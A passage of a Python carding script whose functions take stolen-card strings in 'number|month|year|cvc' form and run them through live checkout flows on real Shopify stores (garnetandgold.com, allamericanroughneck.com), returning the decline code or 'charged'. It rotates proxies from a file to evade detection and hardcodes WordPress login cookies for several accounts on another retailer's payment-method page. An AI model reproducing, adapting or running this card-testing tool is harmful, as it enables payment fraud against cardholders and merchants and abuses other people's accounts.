__typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'receiptId': 'gid://shopify/ProcessedReceipt/1908590313623',
        'sessionToken': 'eFdNVVBZZ1pLZUt5akJwT1FGc0ZtM1hXMVFWTkNGbHRKdG4vd3Y4ZEIyWFlyUXk3aWJQTkRWYmt1b2QzWk9aRTN5SDk2VFF4MGJHREZmMzhiZHNXMXgzM2Fibnl0ZFdLNmg5T09aaFVDSi9SZ0lVcVpuVmRwWHlRQ1AycVJwMTZVZGNCSHN3WXhjc2FSZERxQ2tEMmNvS2MwclloUGY1NkZxNENxYUQ1RzVib2lCRlVXTkxjYno0OTdRRHNjaWlidGJNQzk0TmdNRm96dWVzNFV5VGtBcWNub0hMak4ySU9yd3RuUXN6ekxqMmlGamQySHg2dkE0L1BacXZCc0VqOGRjSGgxZng4d1BqY1hRcnAvRUd4V255aDZZNXZrRFVlOTZ0dkkwTHE5UzFVdzZmRVQxTE5IKzQ9LS15ZE5xT1NHTTVrcnVMNnBiLS0yYWg3ZGRtSCtKdTdldW9sdVFSUkx3PT0',
    },
    'operationName': 'PollForReceipt',
}
	response = requests.post(
    'https://allamericanroughneck.com/checkouts/unstable/graphql',
    params=params,
    cookies=r.cookies,
    headers=headers,
    json=json_data,
)	
	#print(response.text)	
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'
		
			
				
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/plain, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',   
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/collections/sale-accessories/products/garnet-gold-florida-state-team-caution-tape',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	data = {
    'form_type': 'product', 
    'id': '44149980692699',
    'quantity': '1',
    'product-id': '8045728399579',
    'section-id': 'template--19021258162395__main',
}
	response = r.post('https://www.garnetandgold.com/cart/add.js', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',  
    'if-none-match': '"cacheable:e1a22398fead2ba73438f4968a3bc0de"',
    'referer': 'https://www.garnetandgold.com/collections/sale-accessories/products/garnet-gold-florida-state-team-caution-tape',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	
	response = requests.get('https://www.garnetandgold.com/cart', cookies=r.cookies, headers=headers)
	
	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/cart',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	
	
	
	data = {
    'updates[]': '1',
    'note': '',
    'checkout': '',
}
	
	response = r.post('https://www.garnetandgold.com/cart', cookies=r.cookies, headers=headers, data=data)
	headers = {
    'authority': 'checkout.pci.shopifyinc.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.pci.shopifyinc.com',
    'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'credit_card': {
        'number': n,
        'month': mm,
        'year': yy,
        'verification_value': cvc,
        'start_month': None,
        'start_year': None,
        'issue_number': '',
        'name': 'Jhon Cena Tera daddy',
    },
    'payment_session_scope': 'garnetandgold.com',
}
	response = r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
	Id = (response.json()['id'])
	print(Id)
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/json',    
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-checkout-one-session-token': 'ZjBSYTF0RW9QaGM5cUE2SmFWTUxTK0RONE0yRmFUeWord2U2d1dBOXBNQTdQZ2xzcDBEWDk2Q3FYM1VuNHgyanFiWGpGL2g1c2h3bjRvaWhOb3M1dVRxa3VQYkREaGpQZmwzWnZjMU9sa2pqaU5SREo4OERjSnY2VHBtVGF1ZGt0RTJJczROeDBZTWdiRUtrR01PQkx1dFNWazM4NFJsNDFmclFYSlJPd1hiNDZOR1Z4SGNLTUdGOFVmeFVQekt4UCtLYm02MkZvMk13NlpnbmV1aFRXSVd0VmVCQkVkK2U3VGRXSU5sWlpyR3ozdmFwTFROQzNUa2dKOVdSQTZKZkc1UEN2TlNQRGtyOFRrUlZpNHYyc1R5dTdRbkRXK2lMcTVzbzJLa3NrTEE0RFhQaUV0SEx5YnVqLS1paHhzam9YaWxVNzY3eUJQLS1GM3dSSjRKd3A2RzVxSlFPQm9XY1pRPT0',
    'x-checkout-web-build-id': Id,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'no',
    'x-checkout-web-source-id': 'Z2NwLWFzaWEtc291dGhlYXN0MTowMUpRUDBZTjVQM1A2QkJOMk1GREM5TlNBQg',
}
	params = {
    'operationName': 'PollForReceipt',
}
	
	json_data = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'receiptId': 'gid://shopify/ProcessedReceipt/1952477315291',
        'sessionToken': 'ZjBSYTF0RW9QaGM5cUE2SmFWTUxTK0RONE0yRmFUeWord2U2d1dBOXBNQTdQZ2xzcDBEWDk2Q3FYM1VuNHgyanFiWGpGL2g1c2h3bjRvaWhOb3M1dVRxa3VQYkREaGpQZmwzWnZjMU9sa2pqaU5SREo4OERjSnY2VHBtVGF1ZGt0RTJJczROeDBZTWdiRUtrR01PQkx1dFNWazM4NFJsNDFmclFYSlJPd1hiNDZOR1Z4SGNLTUdGOFVmeFVQekt4UCtLYm02MkZvMk13NlpnbmV1aFRXSVd0VmVCQkVkK2U3VGRXSU5sWlpyR3ozdmFwTFROQzNUa2dKOVdSQTZKZkc1UEN2TlNQRGtyOFRrUlZpNHYyc1R5dTdRbkRXK2lMcTVzbzJLa3NrTEE0RFhQaUV0SEx5YnVqLS1paHhzam9YaWxVNzY3eUJQLS1GM3dSSjRKd3A2RzVxSlFPQm9XY1pRPT0',
    },
    'operationName': 'PollForReceipt',
}
	response = requests.post(
    'https://www.garnetandgold.com/checkouts/unstable/graphql',
    params=params,
    cookies=r.cookies,
    headers=headers,
    json=json_data,
) 
	print(response.text)
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'



def get_proxy():
    try:
        with open("proxy.txt", "r") as file:
            proxies = [line.strip() for line in file if line.strip()]

        if not proxies:
            raise ValueError("No proxies found in proxy.txt")
        
        # Select a random proxy
        selected_proxy = random.choice(proxies)
        ip, port, user, password = selected_proxy.split(":")

        # Format the proxy correctly
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    
    except FileNotFoundError:
        print("proxy.txt not found!")
        return None
    except ValueError as e:
        print(e)
        return None



# Example usage:

import requests
import re
import user_agent
import random
import time
import string
import base64
from bs4 import BeautifulSoup

def Tele4(ccx):
    proxy = get_proxy()
    print(proxy)
    from user_agent import generate_user_agent
    user = user_agent.generate_user_agent()
    import requests
    r=requests.session()
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    
    with open('fileb3.txt', 'r') as file:
        first_line = file.readline()
        last_used_times = {}
    
    while True:
        lines = '''aman44%7C1745318670%7CfpFbtDqO5XVF9PDHvau2XzCUQNt0fiQobJm0aPFGphr%7C7b22cfa64bbfb4e56efa23bd6f294acd4da43c40317e1f646ce44e811ad5bace
amavyfyfofyfohun44%7C1745322607%7C8LTnYQKpyJJdx7IRQMdyOEr1dcdqvadieSJFjZDdV5l%7Ccf86ceb83fda2ee4dc1330c2d20fe337852a656632eeda419ab96b39b4af92ce
jhonulove67%7C1745335073%7Ccd49lEhXFWH3AQdmhwOOYbnW7ZUtOaTvzjRp4MCRhOm%7C7af32f8990af11c9b5cc1e84688cfc66064bc345673a0675a5415d22b89cf947
marienonaqueen78%7C1745336640%7C7xt4MrfSsvpbzh85BCkfFFoOT44Y00bHSKRagn0WHzt%7C651ce7bb8df3cc689378b83af016061c4bb3d02ecfd3c4f435f4f13d3d735e82
xoxjhonmeena67%7C1745336956%7CYc9zIjWOaQMC7ErWSDAEWIdw8JW2Hhu5qzNvbdWSZ2C%7C03cb11f4d2495ee83c4ac2b7221375ba82a17a6b3002b652acce638d2e4b389c'''
        lines = lines.strip().split('\n')
        random_line_number = random.randint(0, len(lines) - 1)
        big = lines[random_line_number]
        current_time = time.time()
        
        if big in last_used_times:
            time_since_last_use = current_time - last_used_times[big]
            if time_since_last_use < 10:
                continue    
        
        if big == first_line:
            pass
        else:
            last_used_times[big] = current_time
            break
    
    with open('fileb3.txt', 'w') as file:
        file.write(big)
        print(big)

    cookies = {
    '_ga': 'GA1.1.5590199.1744108911',
    'mailchimp_user_email': 'aman44%40gmail.com',
    'wordpress_logged_in_a3a6a1469a1091436aba07df5e7aa87a': big,
    'tinv_wishlistkey': '22122c',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.flexinnovations.com%2Fmy-account%2Fadd-payment-methods%2F',
    'tinvwl_wishlists_data_counter': '0',
    '_ga_5BLLY83SK2': 'GS1.1.1744111647.2.1.1744111703.0.0.0',
}

    headers = {
    'authority': 'www.flexinnovations.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://www.flexinnovations.com/my-account/payment-methods/',
